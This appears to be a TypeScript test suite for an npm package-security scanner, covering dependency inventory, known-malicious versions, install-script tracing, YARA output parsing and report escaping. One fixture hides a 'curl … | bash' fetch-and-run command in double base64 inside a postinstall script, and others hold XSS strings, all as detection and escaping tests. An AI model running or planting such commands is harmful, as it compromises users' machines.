import * as assert from 'assert';
import * as fs from 'fs/promises';
import * as os from 'os';
import * as path from 'path';
import { gzipSync } from 'zlib';
import { collectPackages } from '../security-inventory';
import { discoverInstallInputs, tokenizeCommand } from '../security-scripts';
import { checkMaliciousPackages, packageFinding } from '../security-catalog';
import { parseAudit, runNpmAudit } from '../security-audit';
import { extractEngine, ensureYaraEngine } from '../security-engine';
import { parseYaraOutput, reviewPackageSecurity } from '../security-review';
import { buildSecurityHtml, reportContent } from '../security-html';
import { SecurityReviewJobs } from '../security-jobs';
import { spawnManaged } from '../managed-process';
import { contained, readBounded } from '../security-files';
import { SECURITY_LIMITS, type InstalledPackage, type SecurityReviewReport } from '../security-types';

async function project(run: (root: string, write: (file: string, value: unknown) => Promise<void>) => Promise<void>) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'acp-security-'));
  const write = async (file: string, value: unknown) => {
    const target = path.join(root, file); assert.ok(contained(root, target));
    await fs.mkdir(path.dirname(target), { recursive: true });
    await fs.writeFile(target, typeof value === 'string' ? value : JSON.stringify(value));
  };
  try { await write('package.json', { name: 'fixture', version: '1.0.0' }); await fs.mkdir(path.join(root, 'node_modules')); await run(root, write); }
  finally { assert.ok(contained(os.tmpdir(), root) && path.basename(root).startsWith('acp-security-')); await fs.rm(root, { recursive: true, force: true, maxRetries: 5 }); }
}
function installed(name = 'example', version = '1.0.0'): InstalledPackage {
  return { id: `node_modules/${name}`, name, version, directory: `/project/node_modules/${name}`, manifest: {}, locations: [`node_modules/${name}`], kinds: ['production'], dependencyPath: ['app', name], workspace: false };
}
function report(): SecurityReviewReport {
  return { schemaVersion: 1, id: 'test', projectName: 'fixture', startedAt: '2026-09-08T10:00:00Z', finishedAt: '2026-09-08T10:01:00Z', state: 'complete', engineVersion: '1.20.0', catalogVersion: 'test', rulesetVersion: '1', packageCount: 1, inputCount: 1, inputBytes: 32, coverage: [], findings: [] };
}
suite('Package security inventory and script discovery', () => {
  test('includes scopes, aliases, nested versions, optional/dev/extraneous packages and verified malicious ranges', async () => project(async (root, write) => {
    await write('package.json', { name: 'app', dependencies: { alias: '*' }, devDependencies: { '@scope/dev': '*' }, optionalDependencies: { optional: '*' } });
    await write('node_modules/alias/package.json', { name: 'ua-parser-js', version: '0.7.29', dependencies: { 'ua-parser-js': '*' } });
    await write('node_modules/alias/node_modules/ua-parser-js/package.json', { name: 'ua-parser-js', version: '0.7.30' });
    await write('node_modules/@scope/dev/package.json', { name: '@scope/dev', version: '2.0.0' });
    await write('node_modules/optional/package.json', { name: 'optional', version: '1.0.0' });
    await write('node_modules/extra/package.json', { name: 'node-ipc', version: '9.2.2' });
    const inventory = await collectPackages(root);
    assert.equal(inventory.packages.length, 6);
    assert.deepEqual(inventory.packages.find(pkg => pkg.name === '@scope/dev')?.kinds, ['development']);
    assert.deepEqual(inventory.packages.find(pkg => pkg.name === 'optional')?.kinds, ['optional']);
    const findings = checkMaliciousPackages(inventory.packages);
    assert.equal(findings.length, 1); assert.equal(findings[0].version, '0.7.29'); assert.equal(findings[0].location, 'node_modules/alias');
  }));
  test('deduplicates pnpm links, traverses the store, and terminates symlink cycles', async () => project(async (root, write) => {
    await write('node_modules/.pnpm/pkg@1/node_modules/pkg/package.json', { name: 'pkg', version: '1.0.0' });
    const actual = path.join(root, 'node_modules/.pnpm/pkg@1/node_modules/pkg');
    await fs.symlink(actual, path.join(root, 'node_modules/pkg'), 'junction');
    await fs.symlink(path.join(root, 'node_modules'), path.join(actual, 'node_modules'), 'junction');
    const inventory = await collectPackages(root);
    assert.equal(inventory.packages.filter(pkg => pkg.name === 'pkg').length, 1);
    assert.ok(inventory.packages.find(pkg => pkg.name === 'pkg')!.locations.length >= 2);
  }));
  test('excludes links outside the root and reports malformed manifests', async () => project(async (root, write) => {
    await fs.symlink(os.tmpdir(), path.join(root, 'node_modules/external'), 'junction');
    await write('node_modules/broken/package.json', '{broken');
    const inventory = await collectPackages(root);
    assert.equal(inventory.coverage.state, 'partial');
    assert.ok(inventory.coverage.messages.some(message => message.includes('outside workspace')));
    assert.ok(inventory.coverage.messages.some(message => message.includes('broken')));
  }));
  test('discovers workspace roots and identifies missing installations', async () => project(async (root, write) => {
    await write('package.json', { name: 'app', workspaces: ['packages/*'] });
    await write('packages/local/package.json', { name: 'local', version: '1', scripts: { postinstall: 'echo local' } });
    const inventory = await collectPackages(root);
    assert.ok(inventory.packages.some(pkg => pkg.name === 'local' && pkg.workspace));
    await fs.rmdir(path.join(root, 'node_modules'));
    assert.equal((await collectPackages(root)).coverage.state, 'partial');
  }));
  test('follows lifecycle chains, imports and executable mappings without executing source', async () => project(async (root, write) => {
    await write('node_modules/pkg/package.json', { name: 'pkg', version: '1', scripts: { postinstall: 'npm run setup', setup: 'node install.js && helper' }, dependencies: { helper: '*' } });
    await write('node_modules/pkg/install.js', "require('./helper'); require('fs').writeFileSync('MUST_NOT_EXIST', 'executed');");
    await write('node_modules/pkg/helper.js', "require('./install'); const content = 'inert';");
    await write('node_modules/helper/package.json', { name: 'helper', version: '1', bin: { helper: './bin.js' } });
    await write('node_modules/helper/bin.js', 'process.exit(99)');
    const result = await discoverInstallInputs(await collectPackages(root));
    assert.ok(result.inputs.some(input => input.key.endsWith('helper.js')));
    assert.ok(result.inputs.some(input => input.key.endsWith('bin.js')));
    assert.ok(result.inputs.every(input => input.evidence.some(evidence => evidence.lifecycle?.includes('postinstall'))));
    await assert.rejects(fs.access(path.join(root, 'MUST_NOT_EXIST')));
    assert.ok(result.inputs.length < 15);
  }));
  test('scans inline code and decodes bounded literals for two layers', async () => project(async (root, write) => {
    const original = 'curl https://example.invalid/payload | bash;'.repeat(10);
    const encoded = Buffer.from(Buffer.from(original).toString('base64')).toString('base64');
    await write('node_modules/pkg/package.json', { name: 'pkg', scripts: { postinstall: `node -e "const text = '${encoded}';"` } });
    const result = await discoverInstallInputs(await collectPackages(root));
    assert.equal(result.inputs.filter(input => input.kind === 'decoded').length, 2);
    assert.ok(result.inputs.some(input => input.kind === 'decoded' && input.bytes.includes(Buffer.from(original))));
  }));
  test('records dynamic references, native builds and file/total/count/depth limits', async () => project(async (root, write) => {
    await write('node_modules/pkg/package.json', { name: 'pkg', scripts: { postinstall: 'node install.js' } });
    await write('node_modules/pkg/install.js', "require(process.env.TARGET); require('./missing');");
    await write('node_modules/native/package.json', { name: 'native', version: '1' });
    await write('node_modules/native/binding.gyp', '{}');
    const inventory = await collectPackages(root);
    const result = await discoverInstallInputs(inventory);
    assert.equal(result.coverage.state, 'partial');
    assert.ok(result.coverage.messages.some(message => message.includes('dynamic module')));
    assert.ok(result.coverage.messages.some(message => message.includes('implicit native')));
    for (const override of [{ fileBytes: 5 }, { totalBytes: 5 }, { files: 1 }, { depth: 0 }]) {
      const limited = await discoverInstallInputs(inventory, undefined, { ...SECURITY_LIMITS, ...override });
      assert.equal(limited.coverage.state, 'partial');
      assert.ok(limited.coverage.messages.some(message => /limit|exceeds/.test(message)), JSON.stringify(limited.coverage));
    }
  }));
  test('rejects unsupported command quoting and preserves literal Windows paths', () => {
    assert.deepEqual(tokenizeCommand('node "C:\\project folder\\install.js" && echo done'), [['node', 'C:\\project folder\\install.js'], ['echo', 'done']]);
    assert.throws(() => tokenizeCommand('node "oops'));
  });
  test('bounded reads reject oversized files and directories', async () => project(async (root, write) => {
    await write('big.txt', '123456789'); await assert.rejects(readBounded(path.join(root, 'big.txt'), 5)); await assert.rejects(readBounded(root, 100));
  }));
  test('inventory and decoded-payload limits are visible coverage gaps', async () => project(async (root, write) => {
    await write('node_modules/one/package.json', { name: 'one', version: '1', scripts: { postinstall: 'node install.js' } });
    await write('node_modules/one/install.js', `const encoded = '${Buffer.from('inert payload'.repeat(80)).toString('base64')}';`);
    await write('node_modules/two/package.json', { name: 'two', version: '1' });
    const bounded = await collectPackages(root, undefined, { packages: 2, depth: 32 });
    assert.equal(bounded.coverage.state, 'partial'); assert.ok(bounded.coverage.messages.some(message => message.includes('count limit')));
    const decoded = await discoverInstallInputs(await collectPackages(root), undefined, { ...SECURITY_LIMITS, decodedBytes: 8 });
    assert.ok(decoded.coverage.messages.some(message => message.includes('decoded payload size limit')));
    await write('package.json', { name: 'app', workspaces: ['packages/*'] }); await write('packages/one/package.json', { name: 'workspace' });
    const shallow = await collectPackages(root, undefined, { packages: 20, depth: 0 });
    assert.ok(shallow.coverage.messages.some(message => message.includes('depth limit')));
  }));
});

suite('Package security advisories, engine and reporting', () => {
  test('preserves multiple audit advisories and maps actual aliased installed versions', () => {
    const pkg = installed('ua-parser-js', '0.7.29'); pkg.locations = ['node_modules/alias'];
    const result = parseAudit({ vulnerabilities: { alias: { nodes: ['node_modules/alias'], range: '<1', via: [
      { source: 1, name: 'alias', title: 'First', severity: 'high', range: '<1' }, { source: 2, name: 'alias', title: 'Second', severity: 'moderate', range: '<1' },
    ] } } }, [pkg]);
    assert.equal(result.findings.length, 2); assert.ok(result.findings.every(finding => finding.version === '0.7.29'));
    assert.throws(() => parseAudit({ error: { code: 'ENOTFOUND' } }, [pkg]));
    assert.throws(() => parseAudit({}, [pkg]));
  });
  test('resolves transitive audit evidence and reports lockfile mismatches', () => {
    const data = { vulnerabilities: { parent: { nodes: ['node_modules/parent'], range: '*', via: ['child'] }, child: { nodes: ['node_modules/child'], via: [{ source: 3, name: 'child', title: 'Child issue' }] } } };
    const result = parseAudit(data, [installed('parent')]);
    assert.equal(result.findings.length, 1); assert.ok(result.findings[0].description.includes('through child')); assert.equal(result.diagnostics.length, 1);
  });
  test('handles disabled, unavailable, failed and nonzero advisory results', async () => project(async (root, write) => {
    assert.equal((await runNpmAudit(root, [], false)).coverage.state, 'skipped');
    assert.equal((await runNpmAudit(root, [], true)).coverage.state, 'partial');
    await write('package-lock.json', {});
    const output = { stdout: '', standardOutput: '{"vulnerabilities":{}}', standardError: '', exitCode: 1 };
    assert.equal((await runNpmAudit(root, [], true, undefined, async () => output)).coverage.state, 'complete');
    assert.equal((await runNpmAudit(root, [], true, undefined, async () => ({ ...output, timedOut: true }))).coverage.state, 'failed');
    assert.equal((await runNpmAudit(root, [], true, undefined, async () => ({ ...output, standardOutput: 'invalid' }))).coverage.state, 'failed');
  }));
  test('fails closed on unsupported engine platforms, checksum mismatch and download errors', async () => project(async root => {
    await assert.rejects(ensureYaraEngine(root, undefined, 'unsupported'), /unavailable/);
    await assert.rejects(ensureYaraEngine(root, undefined, 'win32-x64', async () => Buffer.from('tampered')), /checksum/);
    await assert.rejects(ensureYaraEngine(root, undefined, 'win32-x64', async () => { throw new Error('offline'); }), /offline/);
  }));
  test('cancels promptly while another review is downloading the shared engine', async () => project(async root => {
    let release: (() => void) | undefined;
    const first = ensureYaraEngine(root, undefined, 'win32-x64', async () => {
      await new Promise<void>(resolve => { release = resolve; }); return Buffer.from('invalid');
    });
    const firstResult = assert.rejects(first, /checksum/);
    while (!release) { await new Promise(resolve => setTimeout(resolve, 5)); }
    const controller = new AbortController();
    const second = ensureYaraEngine(root, controller.signal, 'win32-x64'); controller.abort();
    await assert.rejects(second); release(); await firstResult;
  }));
  test('extracts only regular engine entries and rejects archive traversal', () => {
    const tar = (name: string, type = 48) => {
      const data = Buffer.alloc(2048); data.write(name); data.write('00000000003\0', 124); data[156] = type; data.write('exe', 512); return gzipSync(data);
    };
    assert.equal(extractEngine(tar('release/yr'), 'tar.gz', 'yr').toString(), 'exe');
    assert.throws(() => extractEngine(tar('../yr'), 'tar.gz', 'yr'), /Unsafe/);
    assert.throws(() => extractEngine(tar('yr', 50), 'tar.gz', 'yr'), /regular/);
    assert.throws(() => extractEngine(Buffer.alloc(30), 'zip', 'yr'));
  });
  test('maps YARA offsets to source lines and rejects malformed or unexpected output', () => {
    const pkg = installed(); const file = path.resolve('snapshot.input');
    const inputs = new Map([[file, { key: 'file', bytes: Buffer.from('first\nsecond'), packageId: pkg.id, kind: 'source' as const,
      evidence: [{ file: 'node_modules/example/install.js', line: 1, column: 1, snippet: '', chain: ['postinstall'], lifecycle: 'example:postinstall' }] }]]);
    const result = { path: file, rules: [{ identifier: 'acp_process_api', meta: [['title', 'Process'], ['severity', 'low'], ['confidence', 'low'], ['description', 'Indicator']], strings: [{ offset: 6, match: 'second' }] }] };
    const findings = parseYaraOutput(JSON.stringify(result), inputs, [pkg]);
    assert.equal(findings[0].evidence[0].line, 2); assert.equal(findings[0].category, 'script-pattern');
    assert.throws(() => parseYaraOutput('{', inputs, [pkg]));
    assert.throws(() => parseYaraOutput(JSON.stringify({ ...result, path: '/unexpected' }), inputs, [pkg]));
  });
  test('engine failures retain known malicious findings and mark incomplete coverage', async () => project(async (root, write) => {
    await write('node_modules/bad/package.json', { name: 'ua-parser-js', version: '0.7.29', scripts: { postinstall: 'echo test' } });
    const result = await reviewPackageSecurity({ root, storage: path.join(root, 'storage'), rules: '', auditEnabled: false, engineProvider: async () => { throw new Error('engine offline'); } });
    assert.equal(result.state, 'partial'); assert.equal(result.findings[0].category, 'known-malicious');
    assert.ok(result.coverage.some(item => item.component === 'yara-x' && item.state === 'failed'));
  }));
  test('cancelled reviews never claim complete coverage', async () => project(async root => {
    const controller = new AbortController(); controller.abort();
    const result = await reviewPackageSecurity({ root, storage: root, rules: '', auditEnabled: false, signal: controller.signal });
    assert.equal(result.state, 'cancelled'); assert.ok(result.coverage.some(item => item.state === 'skipped'));
  }));
  test('report HTML escapes package content, restricts scripts, and exports without external assets', () => {
    const value = report(); value.projectName = '<img src=x onerror=alert(1)>';
    value.findings = [{ ...packageFinding(installed('<script>'), 'script-pattern', 'test'), title: '</summary><script>alert(1)</script>', references: ['javascript:alert(1)'] }];
    assert.ok(!reportContent(value).includes('<script>'));
    assert.ok(!reportContent(value).includes('javascript:'));
    const html = buildSecurityHtml({ nonce: 'test', style: 'body{}', script: 'void 0;', report: value, standalone: true });
    assert.ok(html.includes('nonce-test')); assert.ok(!html.includes('<link')); assert.ok(!html.includes('data-open='));
    assert.ok(reportContent(report()).includes('No findings detected within the scanned scope'));
  });
});

suite('Security review scheduling and process limits', () => {
  test('coalesces requests and publishes only the tree after the last installation', async () => {
    let runs = 0; const published: SecurityReviewReport[] = [];
    let finish: (() => void) | undefined;
    const jobs = new SecurityReviewJobs(async (_root, signal, outcome) => {
      runs++;
      if (runs === 1) { await new Promise<void>(resolve => { finish = resolve; signal.addEventListener('abort', () => resolve(), { once: true }); }); }
      return { ...report(), id: String(runs), installOutcome: outcome };
    }, (_root, value) => published.push(value), error => { throw error; });
    jobs.request('root', 'manual'); jobs.request('root', 'manual'); await Promise.resolve();
    jobs.beginInstall('root'); jobs.beginInstall('root'); jobs.endInstall('root', 'failed', true); jobs.endInstall('root', 'success', true);
    finish?.(); await jobs.settled('root');
    assert.equal(runs, 2); assert.equal(published.length, 1); assert.equal(published[0].installOutcome, 'success');
  });
  test('manual review remains available when automatic review is disabled', async () => {
    let runs = 0;
    const jobs = new SecurityReviewJobs(async () => { runs++; return report(); }, () => undefined, () => undefined);
    jobs.beginInstall('root'); jobs.endInstall('root', 'failed', false); await jobs.settled('root'); assert.equal(runs, 0);
    jobs.request('root', 'manual'); await jobs.settled('root'); assert.equal(runs, 1);
  });
  test('disposal prevents cancelled jobs from reopening reports', async () => {
    let published = false;
    const jobs = new SecurityReviewJobs(async (_root, signal) => {
      await new Promise<void>(resolve => signal.addEventListener('abort', () => resolve(), { once: true })); return report();
    }, () => { published = true; }, () => undefined);
    jobs.request('root', 'manual'); await Promise.resolve(); jobs.dispose(); await jobs.settled('root'); assert.equal(published, false);
  });
  test('separates workspaces and cancels a running review', async () => {
    const results: string[] = [];
    const jobs = new SecurityReviewJobs(async (_root, signal) => {
      await new Promise<void>(resolve => signal.addEventListener('abort', () => resolve(), { once: true })); return { ...report(), state: 'cancelled' };
    }, (root, value) => results.push(`${root}:${value.state}`), () => undefined);
    jobs.request('one', 'manual'); jobs.request('two', 'manual'); await Promise.resolve();
    jobs.cancel('one'); jobs.cancel('two'); await jobs.settled('one'); await jobs.settled('two');
    assert.deepEqual(results.sort(), ['one:cancelled', 'two:cancelled']);
  });
  test('captures streams separately and enforces timeout, cancellation and output limits', async () => {
    const executable = process.env.ACP_TEST_NODE || process.execPath;
    const env = { ...process.env, ELECTRON_RUN_AS_NODE: '1' };
    const common = { cwd: os.tmpdir(), shell: false, env };
    const streams = await spawnManaged(executable, ['-e', 'process.stdout.write("out");process.stderr.write("err")'], common);
    assert.equal(streams.standardOutput, 'out'); assert.equal(streams.standardError, 'err');
    const unicode = await spawnManaged(executable, ['-e', 'const bytes=Buffer.from("€");process.stdout.write(bytes.subarray(0,1));setTimeout(()=>process.stdout.write(bytes.subarray(1)),20)'], common);
    assert.equal(unicode.standardOutput, '€');
    const timeout = await spawnManaged(executable, ['-e', 'setInterval(()=>{},1000)'], { ...common, timeoutMs: 50 }); assert.ok(timeout.timedOut);
    const controller = new AbortController(); const running = spawnManaged(executable, ['-e', 'setInterval(()=>{},1000)'], { ...common, signal: controller.signal }); controller.abort(); assert.ok((await running).cancelled);
    const limited = await spawnManaged(executable, ['-e', 'process.stdout.write("x".repeat(10000))'], { ...common, maxOutputBytes: 100 });
    assert.ok(limited.outputLimited); assert.ok(limited.stdout.length <= 100);
  });
});
